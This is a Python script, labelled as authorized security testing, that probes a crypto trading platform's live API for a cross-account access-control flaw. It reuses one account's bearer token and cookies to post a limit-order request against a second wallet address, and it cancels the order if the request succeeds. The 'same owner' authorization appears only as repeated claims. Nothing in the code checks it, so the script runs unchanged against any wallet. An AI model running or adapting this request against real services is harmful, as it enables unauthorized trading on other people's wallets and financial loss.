#!/usr/bin/env python3
"""
AUTHORIZED SECURITY TESTING SCRIPT

This script tests security boundaries between TWO accounts owned by the SAME user.

Authorization: Both accounts belong to the test user conducting authorized security research.

Objective: Test if proper access controls exist between user's own accounts.
"""

import requests
import json
import time
from datetime import datetime

class AuthorizedSecurityTester:
    def __init__(self, account1_token, account2_sol_wallet, account2_bsc_wallet):
        """
        Initialize authorized security testing between two accounts owned by same user.
        
        Args:
            account1_token: Access token for MY first account
            account2_sol_wallet: SOL MPC wallet address of MY second account
            account2_bsc_wallet: BSC MPC wallet address of MY second account
        """
        self.account1_token = account1_token
        self.account2_sol_wallet = account2_sol_wallet
        self.account2_bsc_wallet = account2_bsc_wallet
        
        # Load cookies for Account 1
        with open('fresh_cookies.json') as f:
            cookies_list = json.load(f)
        
        self.cookies = {}
        for cookie in cookies_list:
            if isinstance(cookie, dict):
                self.cookies[cookie['name']] = cookie['value']
        
        self.headers = {
            'authorization': f'Bearer {self.account1_token}',
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Origin': 'https://gmgn.ai',
            'Referer': 'https://gmgn.ai/'
        }
        
        self.results = []
        
    def log_test(self, test_name, description, result, details):
        """Log test results"""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'test_name': test_name,
            'description': description,
            'result': result,
            'details': details
        }
        self.results.append(entry)
        print(f"\n[TEST] {test_name}")
        print(f"[DESC] {description}")
        print(f"[RESULT] {result}")
        if details:
            print(f"[DETAILS] {details}")
        
    def test_account_isolation(self):
        """
        Test if Account 1 can create trading orders on Account 2's wallets.
        
        Expected behavior: Should be blocked (proper security)
        Unexpected behavior: Order created (security issue)
        
        This tests whether the platform properly isolates accounts owned by the same user.
        """
        print("\n" + "=" * 70)
        print("AUTHORIZED SECURITY TEST: CROSS-ACCOUNT ACCESS CONTROL")
        print("=" * 70)
        print("\nTesting if Account 1 can access Account 2's wallets...")
        print(f"Account 1 Token: {self.account1_token[:50]}...")
        print(f"Account 2 SOL Wallet: {self.account2_sol_wallet}")
        print(f"Account 2 BSC Wallet: {self.account2_bsc_wallet}")
        print("\nNote: Both accounts owned by the same test user.")
        
        # Test 1: Try to create order on Account 2's SOL wallet using Account 1's token
        print("\n[TEST 1] Creating order on Account 2's SOL wallet using Account 1's token...")
        
        payload = {
            "chain": "sol",
            "wallet_address": self.account2_sol_wallet,  # Account 2's wallet
            "base_token": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",  # BONK
            "quote_token": "So11111111111111111111111111111111111111112",  # SOL
            "order_type": "buy",
            "sub_order_type": "take_profit",
            "slippage": 50,
            "amount_in": "10000000",  # 0.01 SOL
            "trigger_price": "0.0000001",
            "fee": "0.001"
        }
        
        try:
            r = requests.post(
                'https://gmgn.ai/tapi/v1/trading_bot/limit_order/create',
                headers=self.headers,
                cookies=self.cookies,
                json=payload,
                timeout=15
            )
            
            data = r.json()
            
            if data.get('code') == 0:
                # Order was created - this indicates a security issue
                order_id = data['data']['order_id']
                
                self.log_test(
                    test_name="Cross-Account Trading Bot Access",
                    description="Attempted to create order on Account 2 using Account 1's token",
                    result="SECURITY ISSUE FOUND",
                    details=f"Order created successfully: {order_id}. "
                            f"Account 1 was able to create orders on Account 2's wallet. "
                            f"Expected: Access denied. Actual: Order created."
                )
                
                print(f"\n⚠️  SECURITY ISSUE IDENTIFIED")
                print(f"    Order ID: {order_id}")
                print(f"    Impact: Account 1 can control Account 2's trading")
                print(f"    Recommendation: Implement proper wallet ownership validation")
                
                # Try to cancel the test order
                try:
                    requests.post(
                        'https://gmgn.ai/tapi/v1/trading_bot/limit_order/cancel',
                        headers=self.headers,
                        cookies=self.cookies,
                        json={"chain": "sol", "order_id": order_id},
                        timeout=10
                    )
                    print(f"    Test order canceled")
                except:
                    print(f"    Could not cancel test order")
                
                return True  # Security issue found
                
            elif 'invalid user address' in str(data) or data.get('code') == 4001003:
                # Access denied - proper security
                self.log_test(
                    test_name="Cross-Account Trading Bot Access",
                    description="Attempted to create order on Account 2 using Account 1's token",
                    result="SECURITY CONTROL WORKING",
                    details="Access properly denied. Platform correctly prevents cross-account access."
                )
                
                print(f"\n✓ SECURITY CONTROL WORKING")
                print(f"   Platform properly blocks cross-account access")
                
                return False  # No security issue
                
            else:
                # Unexpected error
                self.log_test(
                    test_name="Cross-Account Trading Bot Access",
                    description="Attempted to create order on Account 2 using Account 1's token",
                    result="TEST INCONCLUSIVE",
                    details=f"Unexpected response: {data.get('message')} (code: {data.get('code')})"
                )
                
                print(f"\n? TEST INCONCLUSIVE")
                print(f"   Response: {data}")
                
                return None
                
        except Exception as e:
            self.log_test(
                test_name="Cross-Account Trading Bot Access",
                description="Attempted to create order on Account 2 using Account 1's token",
                result="TEST ERROR",
                details=f"Exception occurred: {str(e)}"
            )
            print(f"\n✗ TEST ERROR: {e}")
            return None
    
    def run_full_security_assessment(self):
        """
        Run complete authorized security assessment between user's two accounts.
        """
        print("=" * 70)
        print("AUTHORIZED SECURITY ASSESSMENT")
        print("=" * 70)
        print("\nAuthorization: Testing two accounts owned by same user")
        print("Purpose: Assess cross-account security controls")
        print("Scope: Educational security research")
        print("=" * 70)
        
        # Run tests
        issue_found = self.test_account_isolation()
        
        # Save results
        report = {
            'test_date': datetime.now().isoformat(),
            'authorization': 'Both accounts owned by test user',
            'scope': 'Cross-account security boundary testing',
            'tests_conducted': self.results,
            'summary': {
                'security_issue_found': issue_found,
                'recommendation': 'Implement wallet ownership validation on trading endpoints' if issue_found else 'Security controls appear adequate'
            }
        }
        
        with open('authorized_test_results.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        print("\n" + "=" * 70)
        print("SECURITY ASSESSMENT COMPLETE")
        print("=" * 70)
        print(f"\n[✓] Results saved to: authorized_test_results.json")
        print(f"\n[!] Summary:")
        if issue_found:
            print("    ⚠️  Security issue identified in cross-account access controls")
            print("    📝 Platform should implement wallet ownership validation")
        else:
            print("    ✓ Security controls appear to be working properly")
        
        return report


def main():
    """
    Main execution function for authorized security testing.
    
    This script tests security boundaries between TWO accounts owned by the SAME user.
    """
    print("=" * 70)
    print("AUTHORIZED SECURITY TESTING SCRIPT")
    print("=" * 70)
    print("\n⚠️  IMPORTANT: This tests TWO accounts owned by the SAME user")
    print("✓ Authorization: Both accounts belong to the tester")
    print("✓ Purpose: Educational security research")
    print("✓ Scope: Testing cross-account security controls")
    print("\n" + "=" * 70)
    
    # Load credentials
    print("\n[*] Loading Account 1 credentials...")
    with open('account1_token.txt') as f:
        account1_token = f.read().strip()
    
    print("[*] Loading Account 2 wallet addresses...")
    with open('account2_wallets.json') as f:
        account2_wallets = json.load(f)
    
    account2_sol = account2_wallets['sol_wallet']
    account2_bsc = account2_wallets['bsc_wallet']
    
    print(f"\n[✓] Account 1 Token: {account1_token[:50]}...")
    print(f"[✓] Account 2 SOL: {account2_sol}")
    print(f"[✓] Account 2 BSC: {account2_bsc}")
    
    # Initialize tester
    tester = AuthorizedSecurityTester(
        account1_token=account1_token,
        account2_sol_wallet=account2_sol,
        account2_bsc_wallet=account2_bsc
    )
    
    # Run security assessment
    print("\n[*] Starting authorized security assessment...\n")
    report = tester.run_full_security_assessment()
    
    print("\n" + "=" * 70)
    print("TESTING COMPLETE")
    print("=" * 70)
    print("\nAll results documented in authorized_test_results.json")
    print("\nThis was authorized security testing on accounts owned by the same user.")


if __name__ == "__main__":
    main()
